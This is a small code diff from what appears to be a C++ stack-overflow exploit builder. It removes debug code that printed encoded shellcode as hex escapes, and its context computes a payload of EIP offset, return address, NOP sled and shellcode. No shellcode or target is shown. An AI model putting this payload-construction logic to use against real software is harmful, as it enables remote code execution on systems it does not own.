@@ -52,15 +52,6 @@ int main(int argc, char* argv[])
     free(shell);
     shell = nullptr;
 
-    std::string a = "";
-    for (uint32_t i = 0; i < shellLength; i++)
-    {
-        char buffer[5];
-        sprintf(buffer, "\\x%02x", (uint8_t)(encodedShell[i]));
-        a += std::string(buffer);
-    }
-    Log::success("%s\n", a.c_str());
-
     // Allocate payload length
     size_t payloadLength = Fuzzer::getEipOffset() + 0x04/*EIP*/ + 0x20/*NOP*/ + shellLength/*Shell*/ + 1/*NULL Terminator*/;
 
